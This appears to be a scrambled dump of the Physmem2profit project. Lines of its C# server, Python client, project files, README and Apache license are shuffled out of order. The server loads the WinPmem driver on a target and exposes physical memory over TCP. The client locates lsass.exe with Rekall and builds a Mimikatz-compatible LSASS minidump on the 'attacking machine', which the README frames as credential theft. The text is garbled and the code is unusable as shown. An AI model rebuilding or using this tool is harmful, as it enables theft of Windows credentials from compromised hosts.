@@ -1,0 +1,1900 @@
+    
+        
+            
+                    
+                                       // Indicates success.
+                                      ///< PMem Info control code.
+                                 Apache License
+                              ///< Driver communication symbolik link path.
+                             ///< Name of the service. Used both as full name and display name.
+                            // Invoke command method.
+                            // Send everything what has been returned by the command.
+                            if (Program.Settings.VerboseMode)
+                            if (response == null 
+                            return true
+                        Environment.Exit(1)
+                        HideConsole = true
+                        Marshal.FreeHGlobal(pData)
+                        Settings.VerboseMode = true
+                        http://www.apache.org/licenses/
+                        if (
+                        {
+                        }
+                     // Process a single packet.
+                    // Allocate memory for the call.
+                    // Check and return status.
+                    // Deallocate global memory.
+                    // Log all registered commands.
+                    CloseServiceHandle(Handle)
+                    Console.ForegroundColor = ConsoleColor.Green
+                    Console.ForegroundColor = ConsoleColor.Red
+                    Console.ForegroundColor = ConsoleColor.White
+                    Console.ForegroundColor = ConsoleColor.Yellow
+                    _ClientThread
+                    _ClientThread = new Thread(new ThreadStart (delegate { this.HandleSingleClient(clientStream)
+                    _ClientThread.Start()
+                    break
+                    extra = b'
+                    foreach (var cmd in commands)
+                    foreach (var cmd in receiver.Value)
+                    if (!PerformCommand(clientStream))
+                    if (methodEnd == -1)
+                    if (pData != IntPtr.Zero)
+                    length = requested_length - padlen
+                    length = requsted_length - padlen
+                    pData = Marshal.AllocHGlobal(sizeof(SERVICE_STATUS_PROCESS))
+                    padlen = (offset 
+                    return
+                    return true
+                    self.extra.append(b'
+                    var clientStream = _TcpListener.AcceptTcpClient().GetStream()
+                    {
+                    }
+                // Close handle to the device first so the service can be stopped
+                // Create and pass a buffer to the driver. We'll be asking for 102400 / 8(ulong) = 12800 values.
+                // Memory runs pairs are listed after all fields in the buffer.
+                // Process CL arguments.
+                // Retrieve all needed parameters.
+                // Sanity checks.
+                // Set back the default console window style.
+                // Show console if requested.
+                // Show error on screen and send it to the client.
+                // Start listening.
+                // The driver sets up the device object and creates the symbolic link. We just need to grab a handle.
+                Close()
+                CloseHandle(_hDevice)
+                Console.ForegroundColor = previousConsoleStyle
+                Console.WriteLine()
+                Delete()
+                Handle = IntPtr.Zero
+                IntPtr pData = IntPtr.Zero
+                Log(exception.ErrorCode.ToString() 
+                OpenOrCreate(pathToDriver)
+                Server.Listen()
+                Settings.Parse(args)
+                Start()
+                Stop()
+                _MemoryRuns.Clear()
+                break
+                build = int(str(x['value']).split('.')[0])
+                byte[] buffer = new byte[102400]
+                case (int)ServiceState.SERVICE_CONTINUE_PENDING:
+                case (int)ServiceState.SERVICE_PAUSED:
+                case (int)ServiceState.SERVICE_PAUSE_PENDING:
+                case (int)ServiceState.SERVICE_RUNNING:
+                case (int)ServiceState.SERVICE_START_PENDING:
+                case (int)ServiceState.SERVICE_STOPPED:
+                case (int)ServiceState.SERVICE_STOP_PENDING:
+                case LogMessageSeverity.Error:
+                case LogMessageSeverity.Success:
+                case LogMessageSeverity.Warning:
+                catch (Exception exception)
+                catch (IOException exception)
+                catch (ThreadAbortException)
+                d[mem] = 'mem'
+                default:
+                finally
+                for (int i = 0
+                for (int offset = FIELDS.Length 
+                get { return Handle != IntPtr.Zero
+                if (IsSet)
+                if (Settings.HideConsole)
+                if (_hDevice == INVALID_HANDLE_VALUE)
+                if (offset 
+                if (pathToDriver.Length == 0)
+                minidump.set_secure_world(secure_world)
+                numBytesRead 
+                output 
+                output.append(minidump_directory_entry.build(s))
+                packet.AddRange(BitConverter.GetBytes(run.Item1))
+                packet.AddRange(BitConverter.GetBytes(run.Item2))
+                return
+                return 0
+                return BitConverter.GetBytes(Convert.ToUInt32(0))
+                return BitConverter.GetBytes(Convert.ToUInt32(exception.Message.Length)).Concat(Encoding.UTF8.GetBytes(exception.Message)).ToArray()
+                return false
+                return null
+                rva 
+                rva_before = rva
+                s.Location.DataSize = len(extra)
+                s.Location.RVA = len(data)
+                s.StreamType = 0x1337
+                s['Location']['DataSize'] = 16 
+                s['Location']['DataSize'] = 4 
+                s['Location']['DataSize'] = MINIDUMP_SYSTEM_INFO.sizeof()
+                s['Location']['DataSize'] = len(self.secure_world)
+                self.extra = []
+                self.gathered.extend(self.extra)
+                string pathToDriver = System.Text.Encoding.UTF8.GetString(args)
+                tail 
+                try
+                uint bytesReturned = 0
+                var receivers = GatherCommandReceivers()
+                {
+                }
+            // Build the packet.
+            // Check if it's a built-in command.
+            // Check if service already exists.
+            // Check if service handle is already set.
+            // Check service status.
+            // Choose the right style for provided severity.
+            // Find command receiver.
+            // Grab a handle to the service manager.
+            // Include all runs.
+            // It doesn't - create it. First check if provided driver file exists.
+            // Read and return the memory fragment.
+            // Read and return the packet.
+            // Read length of the packet.
+            // Register a handler that restores console colors back in case of Ctrl
+            // Remember to initialize all settings with default values.
+            // Return everything we've found.
+            // Sanity check.
+            // Send buffer back to client.
+            // Set read pointer to specified memory fragment.
+            // Show the message.
+            // Simply read in a loop until received requested number of bytes.
+            // Store receivers.
+            // Store unmodified console window style.
+            // Try and start the service.
+            // Try and stop the service.
+            // Use reflection to enlist all receivers and their commands.
+            // Warn early if not elevated.
+            // We expect args to be 16 bytes: 2 x ulong values.
+            /// </summary>
+            /// <summary>
+            /// Parses CL into application settings.
+            => throw new Exception(operationDescription 
+            Byte[] retBuffer = new Byte[length]
+            Console.CancelKeyPress 
+            Error                                                                                   ///< Indicates a failed action.
+            FILE_SHARE_WRITE = 0x00000002
+            List<byte> packet = new List<byte>(_MappingParameters)
+            NetBindDisable = 0x0000000A
+            Protect=0)
+            Protect=int(d['protect'].value))
+            RegionSize=d['end'].value-d['start'].value
+            SERVICE_STATUS status = new SERVICE_STATUS()
+            _Receivers = receivers
+            _TcpListener.Start()
+            _hScManager.Close()
+            _handle.Close()
+            amount_received 
+            assert((self.queued_offset//self.PAGE_SIZE 
+            blob = MINIDUMP_STRING.build(dict(String=module_name))
+            blob = self.socket.recv(to_read)
+            blob.append(data)
+            blobs.append(blob)
+            break
+            catch (Exception exception)
+            catch (Win32Exception exception)
+            config = json.load(f)
+            continue
+            credential_guard = True
+            dir =  { 'st_mode' : stat.S_IFDIR 
+            elif t ==  ModuleListStream:
+            elif t == MemoryInfoListStream:
+            elif t == MimikatzStream:
+            elif t == ModuleListStream:
+            elif t == SystemInfoStream:
+            entry = data[hdr.StreamDirectoryRva
+            f = { 'st_mode' : stat.S_IFREG 
+            finally
+            for (int numBytesRead = 0
+            foreach (Type type in AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes()).Where(p => typeof(ICommandReceiver).IsAssignableFrom(p) 
+            foreach (var receiver in _Receivers)
+            foreach (var run in _MemoryRuns)
+            if 'key' in x and x['key'] == 'NT Build':
+            if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
+            if (!DeleteService(_handle.Handle))
+            if (!File.Exists(pathToDriver))
+            if (!_hScManager.IsSet)
+            if (!_handle.IsSet)
+            if (_handle.IsSet)
+            if (args.Length != 16)
+            if (nameEnd == -1)
+            if len(self.extra) > 0:
+            if mem 
+            if not blob:
+            if s.StreamType == 0:
+            if start <= offset < (start 
+            if start > mod_start 
+            if t == Memory64ListStream:
+            if vmem:
+            job.start()
+            job.terminate()
+            kernel_base = None
+            lsass_pid = row['_EPROCESS'].pid
+            mi['Type'] = 0
+            mi['Type'] = MEM_MAPPED
+            mi['Type'] = MEM_PRIVATE
+            module_name = m[0]
+            modules.append(module)
+            output 
+            output.append(entry)
+            packet.AddRange(BitConverter.GetBytes(Convert.ToUInt64(_MemoryRuns.Count)))
+            public IntPtr Handle
+            public ServiceHandle() => Handle = IntPtr.Zero
+            public ServiceHandle(IntPtr handle) => Handle = handle
+            public ServiceState dwCurrentState = 0
+            public bool IsSet
+            public int checkPoint
+            public int controlsAccepted
+            public int currentState
+            public int dwCheckPoint = 0
+            public int dwControlsAccepted = 0
+            public int dwServiceSpecificExitCode = 0
+            public int dwServiceType = 0
+            public int dwWaitHint = 0
+            public int dwWin32ExitCode = 0
+            public int processID
+            public int serviceFlags
+            public int serviceSpecificExitCode
+            public int serviceType
+            public int waitHint
+            public int win32ExitCode
+            public static UInt16 ListeningPort = 8080
+            public static bool HideConsole = false
+            public static bool VerboseMode = false
+            public static void Parse(string[] commandLineArguments)
+            public void Close()
+            received = self.socket.recv(16)
+            return
+            return -1
+            return None
+            return b'
+            return dir
+            return f
+            return packet
+            return packet.ToArray()
+            return result
+            return retBuffer
+            return retDicionary
+            return true
+            rva 
+            s = minidump_directory_entry.parse(entry)
+            s['Location']['RVA'] = rva
+            secure_world_pages.append(pfn << PAGE_BITS)
+            self._gather_page(pagenum)
+            self._recv_queued()
+            self.cache[self.queued_offset//self.PAGE_SIZE 
+            self.extra.append(b'
+            self.extra.append(self.cache[pagenum])
+            self.image_size = start 
+            self.queued_offset = offset
+            self.read_progress 
+            self.read_progress = 0
+            self.read_stat_cached 
+            self.read_total 
+            size = self.image_size
+            stream_data.append(s)
+            switch (QueryServiceStatus(_handle.Handle).currentState)
+            switch (severity)
+            sys.exit(1)
+            t = wanted_streams[i]
+            to_read -= len(blob)
+            try
+            uint hTemplateFile)
+            unsafe
+            var packet = ReadPacket(clientStream)
+            var previousConsoleStyle = Console.ForegroundColor
+            var result = new byte[length]
+            wanted_streams.append(MimikatzStream)
+            while (true)
+            yield r
+            {
+            }
+          Derivative Works a copy of this License
+          as modifying the License.
+          as part of the Derivative Works
+          do not modify the License. You may add Your own attribution
+          excluding those notices that do not pertain to any part of
+          include a readable copy of the attribution notices contained
+          of the NOTICE file are for informational purposes only and
+          of the following places: within a NOTICE text file distributed
+          stating that You changed the files
+          that such additional attribution notices cannot be construed
+          the Derivative Works
+          wherever such third-party notices normally appear. The contents
+        // Global settings for the whole application.
+        /// </summary>
+        /// <returns>0 if no error occurred.</returns>
+        /// <returns></returns>
+        /// <returns>A buffer containing packet to send.</returns>
+        /// <returns>A dictionary of all receivers and their commands.</returns>
+        /// <returns>Buffer of bytes read.</returns>
+        /// <returns>Read packet.</returns>
+        /// <returns>Service status value.</returns>
+        /// <returns>false if program should be terminated</returns>
+        /// <summary>
+        /// A RAII wrapper for native service-related handles.
+        /// A few access rights for use throughout the code.
+        /// An import used to control visibility of the console window.
+        /// Application entry point.
+        /// Calls native QueryServiceStatusEx function and returns service status.
+        /// Container for all receivers (drivers) and their commands.
+        /// Deletes the service.
+        /// Enumeration type used for logging runtime messages.
+        /// Installs the PMem driver.
+        /// Listens for remote commands. Main loop of the application.
+        /// Logs a single runtime message.
+        /// Main loop of the client's thread.
+        /// Opens driver service or creates one if it doesn't exist.
+        /// Public constructor
+        /// Public constructor.
+        /// Reads a fixed number of bytes from network stream.
+        /// Reads a memory fragment.
+        /// Reads a single packet from provided network stream.
+        /// Reads and processes a single command.
+        /// Sends necessary data to map physical memory as a file system.
+        /// Sockets listener used for communication.
+        /// Starts the driver service.
+        /// Stops the driver service.
+        /// The server object.
+        /// Thread of a connected client.
+        /// Uninstalls the PMem driver.
+        /// Uses reflection to enumerates all commands receivers.
+        CONFIG_FILE = 'config.json'
+        [Command]
+        [Flags]
+        [StructLayout(LayoutKind.Sequential)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        amount_received = 0
+        args = parseInput()
+        assert((self.queued_offset % self.PAGE_SIZE) == 0)
+        blob = MINIDUMP_STRING.build(dict(String=''))
+        blob = []
+        blob = b''.join(blob)
+        blobs = []
+        blobs = b''.join(blobs)
+        buf = b''.join(self.gathered)
+        buf = buf[offset % self.PAGE_SIZE:-(self.PAGE_SIZE-((offset
+        buf = self._get_all()
+        build = int(config['build'])
+        class ServiceHandle
+        close()         
+        config['image'] = vmem
+        count 
+        d = I.IntervalDict()
+        d[mod] = 'fill'
+        data 
+        data = b''.join(blobs)
+        elif d['type'] == 'Private':
+        else:
+        ensureFileExist(CONFIG_FILE)
+        expected_tail_start = rva
+        extra = b''
+        f.write(data)
+        f.write(secure_world)
+        filling 
+        for i in range(len(data)//self.PAGE_SIZE):
+        for job in jobs:
+        for m in self.memory64:
+        for m in self.modules:
+        for r in dirents:
+        for t in wanted_streams:            
+        for x in imageinfo:
+        for x in range(hdr.NumberOfStreams):
+        for x in range(n):
+        hdr = MINIDUMP_HEADER.parse(data)
+        if 'dll_path' in dll and len(dll['dll_path'].v()) > 1:
+        if 'start' not in d:
+        if (count % STATUS_INTERVAL) == 0:
+        if (response):
+        if args.mode == 'all' or args.mode == 'dump':
+        if args.mode == 'all' or args.mode == 'mount':
+        if d['type'] == 'Mapped':
+        if job.is_alive():
+        if kernel_base == 0:
+        if len(self.extra) > 0 or (self.queued_size != 0 and pagenum
+        if not args.mode == 'dump':
+        if not os.path.exists(args.vmem):
+        if op == 'fill':
+        if pagenum in self.cache:
+        if pfn_obj.u3.e2.ReferenceCount == 2 and pfn_obj.u2.ShareCount == 1 and pfn_obj.PteAddress == 0:
+        if self.queued_offset is None:
+        if self.queued_size == 0:
+        if self.read_progress > 1024
+        if self.secure_world:
+        if vmem and not os.path.exists(image_base 
+        if(os.path.exists(path)):
+        image_size = end
+        imageinfo = s.plugins.imageinfo().collect()
+        internal enum LogMessageSeverity
+        internal static Physerver Server = null
+        internal static class Settings
+        jobs[-1].join() 
+        length = requsted_length
+        logging.debug(hex(expected_tail_start))
+        logging.debug(hex(rva))
+        logging.debug(self.systeminfo)
+        memory_ranges = []
+        memoryinfo_list.append(mi)
+        mi = dict(
+        mi['State'] = 0
+        mi['Type'] = 0
+        mod = b''.join(output)
+        modules = []
+        offset = hdr.StreamDirectoryRva
+        offset = pagenum
+        order = ('%s
+        order = ('exit
+        os.mkdir('output')
+        output 
+        output = []
+        output = b''
+        output.append(data[:hdr.StreamDirectoryRva])
+        pass
+        print(e)
+        private ServiceHandle _hScManager = new ServiceHandle()
+        private ServiceHandle _handle = new ServiceHandle()
+        private TcpListener _TcpListener
+        private bool PerformCommand(NetworkStream clientStream)
+        private byte[] ReadPacket(NetworkStream clientStream)
+        private static SERVICE_STATUS_PROCESS QueryServiceStatus(IntPtr serviceHandle)
+        private string _serviceName
+        protected IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1)
+        protected IntPtr _hDevice = IntPtr.Zero
+        protected Thread _ClientThread = null
+        protected byte[] _MappingParameters = new byte[3 
+        protected class SERVICE_STATUS
+        protected enum AccessRights : uint
+        protected enum ServiceState
+        protected static extern bool CloseHandle(IntPtr hObject)
+        protected static extern bool CloseServiceHandle(IntPtr hSCObject)
+        protected static extern bool DeleteService(IntPtr hService)
+        protected static readonly uint INFO_IOCTRL = 0x22C40F
+        protected struct SERVICE_STATUS_PROCESS
+        protected void Delete()
+        protected void HandleSingleClient(NetworkStream clientStream)
+        protected void OpenOrCreate(string pathToDriver)
+        protected void Start()
+        protected void Stop()
+        public DriverService(string serviceName) => _serviceName = serviceName
+        public WinPmem() : base(_ServiceName)
+        public byte[] Install(byte[] args)
+        public byte[] Map(byte[] _)
+        public byte[] Read(byte[] args)
+        public byte[] Uninstall(byte[] _)
+        public enum ServiceControl
+        public static extern int GetConsoleWindow()
+        public static int Main(string[] args)
+        public static void ThrowWin32Exception(string operationDescription)
+        public void Listen()
+        raise Exception('File does not exist: ' 
+        raise FuseOSError(errno.ENOENT)
+        received = self.socket.recv(32)
+        received = self.socket.recv(4)
+        requested_length = length = self.PAGE_SIZE
+        return
+        return -1
+        return 0
+        return args
+        return buf
+        return data
+        return data2
+        return mod 
+        return output 
+        return sock
+        rva = self.MINIDUMP_HEADER_LEN 
+        secure_world.append(data)
+        self.MINIDUMP_HEADER_LEN = 32
+        self.PAGE_SIZE = 4096
+        self.STREAM_COUNT = 4
+        self.STREAM_COUNT = len(wanted_streams)
+        self._recv_queued()
+        self.cache = {}
+        self.driver = driver
+        self.extra = []
+        self.gathered = []
+        self.gathered.extend(blobs)
+        self.gathered.extend(self.extra)
+        self.host = sock.getsockname()[0]
+        self.installArguments = installArguments
+        self.memory64 = []
+        self.memory64 = m64_list
+        self.memoryinfo = []
+        self.memoryinfo = mi_list
+        self.modules = []
+        self.modules = module_list
+        self.port = sock.getsockname()[1]
+        self.queued_offset = None
+        self.queued_size 
+        self.queued_size = 0
+        self.read_progress 
+        self.read_progress = 0
+        self.read_stat_cached = 0
+        self.read_total = 0
+        self.runs = []
+        self.secure_world = None
+        self.secure_world = secure_world
+        self.socket = sock
+        self.socket.close()
+        self.socket.send(msg)
+        self.socket.sendall(msg)
+        self.systeminfo = si
+        self.systeminfo = {}
+        self.systeminfo['CSDVersionRva'] = rva
+        size = end - start
+        stream = MINIDUMP_SYSTEM_INFO.build(self.systeminfo)
+        stream_data = []
+        sys.exit(1)
+        tail = b''
+        time.sleep(1)
+        to_read = length
+        to_read = self.queued_size
+        while amount_received < length:
+        while to_read > 0:
+        with open(CONFIG_FILE) as f:
+        {
+        }
+       http://www.apache.org/licenses/LICENSE-2.0
+      (a) You must give any other recipients of the Work or
+      (an example is provided in the Appendix below).
+      (b) You must cause any modified files to carry prominent notices
+      Contribution(s) alone or by combination of their Contribution(s)
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      Work and such Derivative Works in Source or Object form.
+      You may add Your own copyright statement to Your modifications and
+      and conversions to other media types.
+      and distribution as defined by Sections 1 through 9 of this document.
+      any Contribution intentionally submitted for inclusion in the Work
+      appropriateness of using or redistributing the Work and assume any
+      as of the date such litigation is filed.
+      by You to the Licensor shall be under the terms and conditions of
+      by such Contributor that are necessarily infringed by their
+      comment syntax for the file format. We also recommend that a
+      copyright notice that is included in or attached to the work
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      except as required for reasonable and customary use in describing the
+      excluding communication that is conspicuously marked or otherwise
+      exercising permissions granted by this License.
+      file or class name and description of purpose be included on the
+      granted to You under this License for that Work shall terminate
+      has been advised of the possibility of such damages.
+      identification within third-party archives.
+      institute patent litigation against any entity (including a
+      may provide additional or different license terms and conditions
+      meet the following conditions:
+      of your accepting any such warranty or additional liability.
+      on behalf of whom a Contribution has been received by Licensor and
+      or a Contribution incorporated within the Work constitutes direct
+      or by an individual or Legal Entity authorized to submit on behalf of
+      or other liability obligations and/or rights consistent with this
+      origin of the Work and reproducing the content of the NOTICE file.
+      replaced with your own identifying information. (Don't include
+      result of this License or out of the use or inability to use the
+      risks associated with Your exercise of permissions under this License.
+      submitted to Licensor for inclusion in the Work by the copyright owner
+      subsequently incorporated within the Work.
+      the Work and Derivative Works thereof.
+      the brackets!)  The text should be enclosed in the appropriate
+      the conditions stated in this License.
+      the copyright owner that is granting the License.
+      the original version of the Work and any modifications or additions
+      the terms of any separate license agreement you may have executed
+      unless required by applicable law (such as deliberate and grossly
+      where such license applies only to those patent claims licensable
+      with Licensor regarding such Contributions.
+      with the Work to which such Contribution(s) was submitted. If You
+    )
+    ///     [Command]
+    ///     {
+    ///     }
+    ///   can be used as well).
+    ///   of the command) and return a byte[] that will be sent back to the connected TCP client or null if there's nothing to send back (to report progress or indicate and error Program.Log
+    /// </example>
+    /// </summary>
+    /// <example>
+    /// <summary>
+    /// A simple TCP Server used for communication.
+    /// An attribute used to indicate a method in ICommandReceiver-inherited class that is a Command. Such methods need to take a single byte[] argument (a collective buffer of parameters
+    /// An interface used to indicate a type (by inheriting this interface) that is a processor of commands sent by our server.
+    /// Application class.
+    /// class MyCommandReceiver : public ICommandReceiver
+    /// {
+    /// }
+    1. 
+    1. Build 
+    </startup>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <AssemblyName>Physmem2profit</AssemblyName>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>pdbonly</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <Prefer32Bit>false</Prefer32Bit>
+    <ProjectGuid>{814708C9-2320-42D2-A45F-31E42DA06A94}</ProjectGuid>
+    <RootNamespace>Physmem2profit</RootNamespace>
+    <StartupObject />
+    <TargetFrameworkProfile />
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    <startup> 
+    MEM_MAPPED = 0x40000
+    MEM_PRIVATE = 0x20000
+    PAGE_BITS = 12
+    PAGE_SIZE = 0x1000
+    PAGE_SIZE = 4096
+    STATUS_INTERVAL = 512
+    [AttributeUsage(AttributeTargets.Method)]
+    addr_space = task.get_process_address_space()
+    arch = s.profile.metadata('arch')
+    args = parser.parse_args()
+    build = 0
+    class DriverService
+    config = {}
+    count = 0
+    credential_guard = False
+    data = minidump.build()
+    def __del__(self):
+    def __init__(self):
+    def _build_memoryinfo_list_stream(self):
+    def _get_all(self):
+    def _recv_queued(self):
+    def build(self):
+    else:
+    ensureFileExist(config['image'])
+    except ConnectionRefusedError:
+    except Exception as e:
+    except KeyboardInterrupt:
+    filling = I.empty()
+    for addr in secure_world_pages:
+    for d in s.plugins.vaddump(pids=[pid]).collect():
+    for dll in s.plugins.dlllist(pids=[pid]).collect():
+    for job in jobs:
+    for pfn in range(image_size//PAGE_SIZE):
+    for row in s.plugins.pslist().collect():
+    for row in s.plugins.pslist(method='PsActiveProcessHead').collect():
+    for x in list(filling):
+    for x in range(120):
+    if 'build' in config:
+    if (image_size == 0 or image_size != os.path.getsize(vmem_filepath)) and not os.path.exists(image_base 
+    if (not os.path.exists('output')):
+    if args.mode == 'all' or args.mode == 'mount':
+    if args.vmem:
+    if vmem:
+    image_size = 0
+    interface ICommandReceiver
+    internal class Physerver
+    lsass_pid = None
+    main()
+    major = int(s.profile.metadata('major'))
+    memory64_list = []
+    memoryinfo_list = []
+    minidump = Minidump()
+    minidump.set_memory64(memory64_list)
+    minidump.set_memoryinfo_list(memoryinfo_list)
+    minidump.set_module_list(module_list)
+    minidump.set_systeminfo(systeminfo)
+    minor = int(s.profile.metadata('minor'))
+    module_list = []
+    module_list = sorted(module_list)
+    operations = []
+    parser = argparse.ArgumentParser(description='physmem2profit')
+    pslist = s.plugins.pslist(proc_regex='lsass.exe')
+    public class Command : Attribute
+    public class Program
+    return args
+    return b''.join(secure_world)
+    return memoryinfo_list
+    return module_list
+    return secure_world
+    s = session.Session(
+    secure_world = []
+    secure_world_pages = []
+    task = next(pslist.filter_processes())
+    try:
+    with tempfile.TemporaryDirectory() as mountpoint:
+    {
+    }
+    })
+   1. Definitions.
+   2. Grant of Copyright License. Subject to the terms and conditions of
+   3. Grant of Patent License. Subject to the terms and conditions of
+   4. Redistribution. You may reproduce and distribute copies of the
+   6. Trademarks. This License does not grant permission to use the trade
+   7. Disclaimer of Warranty. Unless required by applicable law or
+   9. Accepting Warranty or Additional Liability. While redistributing
+   APPENDIX: How to apply the Apache License to your work.
+   Copyright [yyyy] [name of copyright owner]
+   END OF TERMS AND CONDITIONS
+   See the License for the specific language governing permissions and
+   You may obtain a copy of the License at
+   limitations under the License.
+   you may not use this file except in compliance with the License.
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+  <PropertyGroup>
+  @exceptions Exception if arg was not provided.
+  @exceptions Exception if connection was not created.
+  @exceptions Exception if not all required parameter were provided.
+  @param _frame unused parameter.
+  @param _sig unused parameter.
+  @param arg argument to check.
+  @param driver name of driver to be used.
+  @param host ip address of host to connect.
+  @param installArguments data required by driver. Defined by driver Install function on server.
+  @param port number of port to connect.
+  @param removeOldConfig function will delate outdated config file.
+  @param sock socket connection with server.
+  @param str custom name for argument.
+  @return object with all information required to start program.
+  Trigers fetching queued data.
+  Use Fuse to create abstract file. File location and parameters are provided in config.json.
+ !p.IsAbstract))
+ '.vmss'):
+ (FIELDS.Length - 1))
+ // ACQUISITION_MODE_PTE_MMAP
+ @exceptions Exception if file does not exist.
+ @exceptions Exception if server was unable to deliver basic data.
+ @param BaseRva addres of data
+ @param data dump
+ @param data existing minidump
+ @param driver driver class used by server to expose memory.
+ @param extra data from Secure World
+ @param filepath path to memory dump.
+ @param installArguments additional data defined by driver class.
+ @param label created memory dump will be stored as 'output/label-date-lsass.dmp'
+ @param m64_list memory64 list
+ @param mi_list memory info list
+ @param module_list list of loaded modules.
+ @param module_list module list
+ @param mountpoint path to file with mounted memory.
+ @param offset offset from file start.
+ @param pagenum number of page to retrive.
+ @param path path of file/directory.
+ @param path path to file.
+ @param pid pid of process to read.
+ @param requsted_length requested size of data.
+ @param rva address of data.
+ @param s rekall session.
+ @param si system info
+ @param sock socket connection with server.
+ Add data to cache
+ Add the stuff from extra anyway
+ Always successful. __init__ ensures data is accessible.
+ Append Secure World data to an existing minidump
+ Attempt to read these anyway. Rekall will fill with zeros if the read fails
+ Build memory64 stream.
+ Build memoryinfo list stream.
+ Build minidump
+ Build systeminfo stream.
+ Caching
+ Call main if file is used as entry point.
+ Can triger fetching queued data from server.
+ Check if required argument was provided.
+ Class constructor
+ Class constructor.
+ Class used to build Mimikatz-compatible minidump
+ Class used to mimic file access to external memory.
+ Connect to server and send data
+ Convert.ToInt32(numberOfRuns) 
+ Creates LSASS process memory dump.
+ Credential Guard
+ Destructor closing connection.
+ Ensure correct close.
+ Functions exposed by each driver class on server.
+ Future work
+ Get list of available address ranges for LSASS
+ Get system info.
+ Grzegorz Rychlik for refactoring the code for the first release
+ Install driver and recover data necessary to read memory.
+ Installation Instructions
+ Is there anything to read from network
+ Janusz Szmigielski for refactoring the code for the first release
+ MINIDUMP_MEMORY_DESCRIPTOR64.sizeof()
+ MINIDUMP_MEMORY_INFO.sizeof()
+ MINIDUMP_MODULE.sizeof()
+ Main function of module.
+ Main function of package.
+ Marshal.GetLastWin32Error() 
+ Memory info list info setter.
+ Module list setter.
+ More Information
+ Mount external memory exposed by socket as file.
+ Not implemented
+ Not supported.
+ Only one file is supported.
+ Open socket connection with server.
+ Parse memory dump.
+ Pawel Kurowski for refactoring the code for the first release
+ Physmem2profit
+ Read 
+ Read list of modules.
+ Read memory info of process.
+ Read memory of process.
+ Receive map data from the server
+ Same as read_cached.
+ Send command to unload the driver
+ Send exit command
+ Setting up a virtual machine for testing
+ Setup logging as required. Rekall will log to the standard logging service.
+ System info setter.
+ TODO: Figure out how to get the state...
+ TODO: More meaningful defaults
+ TODO: Some of the constants are specific to building Mimikatz-compatible minidumps
+ TODO: Somehow identify MEM_IMAGE
+ Testing
+ The Secure World data is also stored to 
+ The keys should match fsminidump
+ This will write the LSASS minidump to 
+ Usage
+ Visual Studio Version 16
+ We don't want to cache these
+ What parts of the module are available
+ When executed with 
+ Write the config to JSON file
+ You can download the signed Winpmem driver [here](https://github.com/Velocidex/WinPmem/raw/master/kernel/binaries/winpmem_x64.sys). This driver needs to be present on the target host.
+ _serviceName 
+ a blog post explaining why this approach to credential theft was chosen.
+ and
+ and 
+ cmd.Name 
+ command 
+ data[len(mod):] 
+ extra
+ fill
+ https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_memory64_list
+ https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_memory_descriptor
+ https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_memory_info
+ https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_memory_info_list
+ https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_system_info
+ https://docs.microsoft.com/en-us/windows/win32/api/verrsrc/ns-verrsrc-vs_fixedfileinfo
+ i < commandLineArguments.Length
+ i) not in self.cache)
+ i] = data[i
+ ip.ToString() 
+ length) - (start 
+ length) > (start 
+ memory64 setter.
+ message)
+ minidump_directory_entry.sizeof()
+ mod != I.empty():
+ needs to be running on the target machine before you run this command.
+ new Win32Exception(Marshal.GetLastWin32Error()).Message)
+ numBytesRead < length
+ offset 
+ offset < end
+ on the attacking machine
+ on the attacking machine.
+ on the attacking machine. This command will activate the virtualenv created by 
+ on the target as admin.
+ p.IsClass 
+ path)
+ receiver.Key.GetType().Name 
+ response.Length != 0)
+ says 
+ self.queued_offset is guaranteed to be a multiple of self.PAGE_SIZE
+ send first order to install driver.
+ send map order.
+ severityCharacter 
+ size
+ size)
+ size):
+ size:
+ sizeof(UInt64)
+ sizeof(UInt64))
+ sizeof(UInt64))))
+ sizeof(UInt64)]
+ str 
+ tail
+ tcpPort 
+ to ensure 
+ type.Name 
+ wait only for last child.
+ with Visual Studio
+ within the Source form or
+ }))
+!/bin/bash
+!/usr/bin/env python3
+![Overview of Physmem2profit](docs/physmemlayout.png)
+"                                Program.Log(""Invoking Command "" "
+"                                clientStream.Write(response, 0, response.Length)"
+"                            throw new ArgumentException(""Couldn't parse IP number for -i/--ip CL switch."")"
+"                            throw new ArgumentException(""Couldn't parse port number for -p/--port CL switch."")"
+"                            throw new ArgumentException(""No IP number for -i/--ip CL switch provided."")"
+"                            throw new ArgumentException(""No port number for -p/--port CL switch provided."")"
+"                            var response = cmd.Invoke(receiver.Key, new object[] { SubArray(packet, methodEnd "
+"                           Version 2.0, January 2004"
+"                        Program.Log(""   Registered command: "" "
+"                        ThrowWin32Exception(""QueryServiceStatusEx failed."")"
+"                        else if (!IPAddress.TryParse(commandLineArguments[i], out ListeningIp))"
+"                        else if (!UInt16.TryParse(commandLineArguments[i], out ListeningPort))"
+"                        if (String.Compare(cmd.Name, command, StringComparison.OrdinalIgnoreCase) == 0)"
+"                        throw new Exception(""Wrong packet. Method not provided"")"
+"                    // Someone has joined. Create a new thread, but first, check if there is another client connected at the moment and disconnect him."
